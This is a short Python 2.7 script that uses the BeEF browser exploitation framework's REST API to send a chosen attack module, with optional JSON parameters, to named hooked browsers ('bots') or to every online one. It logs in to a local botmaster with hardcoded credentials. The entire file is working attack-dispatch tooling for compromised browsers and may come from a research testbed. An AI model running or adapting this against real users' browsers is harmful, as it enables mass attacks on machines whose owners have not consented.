#!/usr/bin/python2.7

#
# This script is used to send an attack module (given by its module-id)
# with given parameters to either all bots or a given list of bots, determined by their DNS names
#
#
#  Required parameters:
#			--module MODULE_NR
#  optional parameters:
#			--bots
#			.. a list of bots, e.g. bot1 bot2 bot3
#			--params
#			.. attack parameters as JSON-String, e.g '{"parameter":"value"}'
#			--https
#			.. use https instead of http to contact the botmaster
#

import sys, json, socket, argparse
from beefapi import BeefAPI


# authentication parameters for the botmaster
username = 'ansii'
password = 'ansii'


parser = argparse.ArgumentParser(description="Execute Beef-Attacks using Beefs RESTful API")
parser.add_argument("--module",help="Attack module number",required=True)
parser.add_argument("--bots",nargs='+',help="List of target bots")
parser.add_argument("--params",help="JSON-Parameters for the selected attack module")
parser.add_argument("--https",dest="https",action="store_true", help="Use HTTPS")
parser.set_defaults(https=False)

args=parser.parse_args()

beef = BeefAPI({})

if args.https:
	# substitute http-URLs with https pendants
	beef.url="https://127.0.0.1:3000/api/"
	beef.login_url="https://127.0.0.1:3000/api/admin/login"

beef.login(username,password)

print "------------------------------- EXECUTING ATTACK MODULE "+args.module+" -------------------------------"


if args.bots is not None:
	# the script was executed with a given list of bots
	botlist = args.bots
	for bot in botlist:
		# get IP for the given DNS-names
		ip = socket.gethostbyname(bot)
		print "Executing attack on bot "+bot+" ("+ip+")"
		if args.params is not None:
			# there are parameters for the attack module
			print beef.hooked_browsers.online.findbyip(ip)[0].run(args.module, json.loads(args.params))
		else:
			print beef.hooked_browsers.online.findbyip(ip)[0].run(args.module)

else:
	# no list of bots was given, execute command on all hooked browsers
	print "Executing attack on all active bots"
	for bot in beef.hooked_browsers.online:
		if args.params is not None:
			# there are parameters for the attack module
			print bot.run(args.module,json.loads(args.params))
		else:
			print bot.run(args.module)

